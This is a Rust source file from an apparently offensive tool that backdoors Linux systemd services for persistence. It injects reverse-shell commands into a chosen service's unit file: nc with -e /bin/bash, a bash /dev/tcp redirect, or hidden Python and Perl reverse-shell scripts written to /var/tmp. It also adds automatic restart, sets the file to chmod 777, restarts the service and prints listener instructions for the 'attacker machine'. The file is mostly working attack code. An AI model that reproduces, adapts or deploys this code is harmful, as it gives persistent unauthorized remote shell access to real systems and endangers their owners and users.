use std::process::Command;
use std::fs::File;
use std::io::{self, BufRead};
use std::io::prelude::*;

use crate::sanitizer;

pub fn get_service(service_name: String, mut path: String, choice: u8, source_ip: String, port: String) -> io::Result<()> {
    
    let last_char: Option<char> = path.chars().last();

    if let Some(slash) = last_char  {
        if slash == '/'{

        }
        else {
            path.push('/');
        }
        
    }

    let s_name = service_name.clone();
    let s_path = path.clone();
    let full_path = [s_path, s_name].concat();

    //open the service file
    let file = File::open(&full_path)?;

    //Get all lines in the service file
    let reader = io::BufReader::new(file);

    let mut lines = Vec::new();

    //Push all lines contained in the service file to the 'lines' vector
    for line in reader.lines () {
        lines.push(line?);
    }

    modify_service(service_name, path, choice, lines, source_ip, port);

    Ok(())

}

fn modify_service(service_name: String, path: String, choice: u8, mut lines: Vec<String>, source_ip: String, port: String){
    let s_port = port.clone();
    let mut payload_to_copy = String::new();
    let mut i: usize = 0;
    let mut y: usize = 0;
    let sleep = String::from("ExecStartPre=/bin/sleep 15");

    
    
    for line in &lines{
        //Depending the choice, the approach to infect existing process is different
        if line.contains("[Service]") {
            //Building the process infection by nc reverse shell command
            if choice == 1 {
                let mut payload = ["ExecStartPost=nc ", &source_ip].concat();
                payload.push_str(" ");
                payload.push_str(&port);
                payload.push_str(" -e /bin/bash");

                payload_to_copy = payload.clone();

                break;

            }
            //Building the process infection by the usage of /dev/tcp reverse shell command
            else if choice == 2 {
                let mut payload = ["ExecStartPre=/bin/bash -c 'bash -i >& /dev/tcp/", &source_ip].concat();
                payload.push_str("/");
                payload.push_str(&port);
                payload.push_str(" 0>&1'&\n");
 
                lines.insert(i+1, payload);
                let always = String::from("Restart=always\n");
                lines.insert(i+1, always);
                break;

            }
            //Building the process infection by the usage of reverse shell script in python
            else if choice == 3 {
                let result = write_shell_pyfile(port, source_ip);
                sanitizer::sanitize_return_fn(result);
                let filename = "python /var/tmp/.shell.py";
                let mut payload = ["ExecStartPost=", filename].concat();
                payload.push_str("\n");

                payload_to_copy = payload.clone();
                break;
                

            }
            //Building the process infection by the usage of reverse shell script in perl
            else if choice == 4 {
                let result = write_shell_perl(port, source_ip);
                sanitizer::sanitize_return_fn(result);
                let filename = "perl /var/tmp/.shell.pl";
                let mut payload = ["ExecStartPost=", filename].concat();
                payload.push_str("\n");

                payload_to_copy = payload.clone();
                break;

            }
            
            
            
            break;
        }
        i += 1;

        
    }

    if choice == 1 || choice == 3 || choice == 4 {
        let mut service_index = None;
        for (i, line) in lines.iter().enumerate() {
            if line.trim() == "[Service]" {
                service_index = Some(i);
                break;
            }
        }

        // Recherche de l'index de [Install]
        let mut install_index = None;
        for (i, line) in lines.iter().enumerate() {
            if line.trim() == "[Install]" {
                install_index = Some(i);
                break;
            }
        }

        if let Some(service_index) = service_index {
            // Si [Install] est trouvé après [Service]
            if let Some(install_index) = install_index {

                if install_index > service_index {
                    // Ajouter la ligne à la dernière ligne de [Service]
                    lines.insert(install_index - 1, payload_to_copy);
                    let always = String::from("Restart=always\n");
                    lines.insert(install_index - 1, always);
                }
                else {
                    // [Install] n'a pas été trouvé, ajouter la ligne à la fin du vecteur
                    lines.push(payload_to_copy);
                    let always = String::from("Restart=always\n");
                    lines.push(always);
                }
            } 
            
        }             
    }


    //Add sleep command in the process to ensure the network is started when the server restart
    for line2 in &lines{
        if line2.contains("[Service]") {

        
        lines.insert(y+1, sleep);
        break;

        }

        y +=1;


    }
    let serv_name = service_name.clone();

    let result = write_service(service_name, path, &lines);
    sanitizer::sanitize_return_fn(result);

    //systemctl daemon-reload command
    let daemon_reload = "systemctl daemon-reload";
    let mut output = Command::new("sh")
    .arg("-c")
    .arg(&daemon_reload)
    .output()
    .expect("Failed to execute command");

    let mut err_string = String::from_utf8_lossy(&output.stderr).to_string();

    sanitizer::sanitize_system_command(&err_string);

    //Stop the infected service
    let stop_service = ["systemctl stop ", &serv_name].concat();
    output = Command::new("sh")
    .arg("-c")
    .arg(&stop_service)
    .output()
    .expect("Failed to execute command");

    err_string = String::from_utf8_lossy(&output.stderr).to_string();

    sanitizer::sanitize_system_command(&err_string);

    let start_service = ["systemctl start ", &serv_name].concat();

    let mut input = String::new();
    let mut ok = String::new();
    while &ok != "ok" {
        println!("\x1b[31mAre you ready to get access with the backdoor ? \n");
        println!("On your 'Attacker machine' please put this nc command before to continue : nc -lvp {} \n", s_port);
        println!("When you are ready, please put 'ok' in lowercase");
        io::stdin().read_line(&mut input).expect("Error while reading parameter !");
        input = input.trim_end_matches('\n').to_string();
        ok = input.clone();
        input.clear();
    }

    println!("\nGreat ! Please wait 30 sec to have shell in your 'Attacker machine' terminal, and your backdoor will be installed correctly\x1b[0m\n");
    //Start the infected service
    output = Command::new("sh")
    .arg("-c")
    .arg(&start_service)
    .output()
    .expect("Failed to execute command");

    err_string = String::from_utf8_lossy(&output.stderr).to_string();

    sanitizer::sanitize_ex_stderr(&err_string);
    println!("\x1b[36mBackdoor is installed and you have a reverse shell ! When the service will restart or the machine will reboot you will have a new reverse shell !\n");
    println!("But, don't forget to execute this command before: nc -lvp {}\n", s_port);
    println!("If you loose the reverse shell, don't worry ! Put again nc command on your attacker machine and wait\x1b[0m\n");

    

    


}

fn write_shell_pyfile(port: String, source_ip: String) -> std::io::Result<()>{
    let mut file = File::create("/var/tmp/.shell.py")?;
    file.write_all(b"import socket,subprocess,os;\n")?;
    file.write_all(b"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\n")?;
    let mut v_ip = ["v_ip='", &source_ip].concat();
    v_ip.push_str("';\n");
    file.write_all(v_ip.as_bytes())?;
    let mut v_port = ["s.connect((v_ip,", &port].concat();
    v_port.push_str("));\n");
    file.write_all(v_port.as_bytes())?;
    file.write_all(b"os.dup2(s.fileno(),0);\n")?;
    file.write_all(b"os.dup2(s.fileno(),1);\n")?;
    file.write_all(b"os.dup2(s.fileno(),2);\n")?;
    file.write_all(b"v_shell_path='/usr/bin/bash';\n")?;
    file.write_all(b"v_shell_value='-i';\n")?;
    file.write_all(b"p=subprocess.call([v_shell_path,v_shell_value]);\n")?;

    Ok(())
}

fn write_shell_perl(port:String, source_ip: String) -> std::io::Result<()>{
    let mut file = File::create("/var/tmp/.shell.pl")?;
    file.write_all(b"use Socket;\n")?;
    let mut v_ip = ["$i='", &source_ip].concat();
    v_ip.push_str("';\n");
    file.write_all(v_ip.as_bytes())?;
    let  mut v_port = ["$p=", &port].concat();
    v_port.push_str(";\n");
    file.write_all(v_port.as_bytes())?;
    file.write_all(b"socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));\n")?;
    file.write_all(b"if(connect(S,sockaddr_in($p,inet_aton($i)))){\n")?;
    file.write_all(b"open(STDIN,'>&S');\n")?;
    file.write_all(b"open(STDOUT,'>&S');\n")?;
    file.write_all(b"open(STDERR,'>&S');\n")?;
    file.write_all(b"exec('/usr/bin/bash -i');\n")?;
    file.write_all(b"};\n")?;

    Ok(())
}

fn write_service (service_name: String, path: String, modified_service: &Vec<String>) -> std::io::Result<()> {

    let full_path = [path, service_name].concat();
    let chmod = ["chmod 777 ", &full_path].concat();
    let mut file = File::create(&full_path)?;
    //Write the service with malicious modification in the service file
    for elem in modified_service {
        //For each line add \n
        let line_to_write = [elem, "\n"].concat();
        file.write_all(line_to_write.as_bytes())?;
    }

    let output = Command::new("sh")
    .arg ("-c")
    .arg(&chmod)
    .output()
    .expect("Failed to execute command");

    let err_string = String::from_utf8_lossy(&output.stderr).to_string();

    sanitizer::sanitize_system_command(&err_string);



    Ok(())

}